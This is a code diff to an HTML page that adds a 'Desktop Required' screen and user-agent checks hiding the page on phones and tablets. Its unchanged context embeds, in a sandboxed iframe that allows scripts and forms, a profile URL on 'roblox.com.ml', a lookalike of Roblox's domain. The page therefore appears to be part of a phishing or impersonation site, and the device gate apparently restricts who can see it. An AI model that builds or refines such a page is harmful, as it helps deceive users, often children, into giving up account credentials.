@@ -57,6 +57,37 @@ font: inherit;
 color: inherit;
 }
 
+.device-block {
+display: none;
+min-height: 100vh;
+padding: 2rem;
+background: linear-gradient(180deg, #121d31 0%, var(--bg) 100%);
+color: var(--text);
+align-items: center;
+justify-content: center;
+}
+
+.device-block-card {
+width: min(100%, 520px);
+background: rgba(20, 28, 43, 0.94);
+border: 1px solid var(--divider);
+border-radius: 12px;
+padding: 1.5rem;
+box-shadow: var(--shadow);
+text-align: center;
+}
+
+.device-block-card h2 {
+font-size: 1.5rem;
+font-weight: 800;
+margin-bottom: 0.5rem;
+}
+
+.device-block-card p {
+color: var(--muted);
+font-size: 0.95rem;
+}
+
 .app {
 min-height: 100vh;
 display: grid;
@@ -456,9 +487,16 @@ height: 68vh;
 </style>
 </head>
 <body>
+<div class="device-block" id="deviceBlock">
+  <div class="device-block-card">
+    <h2>Desktop Required</h2>
+    <p>This page is only available on desktop or laptop. Please reopen it on a computer.</p>
+  </div>
+</div>
+
 <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
 
-<div class="app">
+<div class="app" id="desktopApp">
 <aside class="sidebar" id="sidebar">
 <div class="brand" aria-label="Brand logo">
 <svg class="brand-logo" width="44" height="50" viewBox="0 0 44 50" fill="none" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
@@ -564,6 +602,27 @@ sandbox="allow-scripts allow-forms allow-same-origin"
 </div>
 
 <script>
+const deviceBlock = document.getElementById('deviceBlock');
+const desktopApp = document.getElementById('desktopApp');
+
+function isBlockedDevice() {
+  const ua = navigator.userAgent || navigator.vendor || window.opera;
+  const isPhoneOrTabletUA = /Android|webOS|iPhone|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(ua);
+  const isIPad = /iPad/i.test(ua) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);
+  const smallTouchScreen = window.matchMedia('(max-width: 1024px)').matches && window.matchMedia('(pointer: coarse)').matches;
+  return isPhoneOrTabletUA || isIPad || smallTouchScreen;
+}
+
+function applyDeviceGate() {
+  if (isBlockedDevice()) {
+    deviceBlock.style.display = 'flex';
+    desktopApp.style.display = 'none';
+  } else {
+    deviceBlock.style.display = 'none';
+    desktopApp.style.display = 'grid';
+  }
+}
+
 const CONFIG = {
 embedUrl: 'https://www.roblox.com.ml/users/234145857712/profile'
 };
@@ -613,10 +672,13 @@ openSidebar();
 sidebarBackdrop.addEventListener('click', closeSidebar);
 
 window.addEventListener('resize', () => {
-if (window.innerWidth > 980) {
-closeSidebar();
-}
+  applyDeviceGate();
+  if (window.innerWidth > 980) {
+    closeSidebar();
+  }
 });
+
+applyDeviceGate();
 </script>
 </body>
 </html>
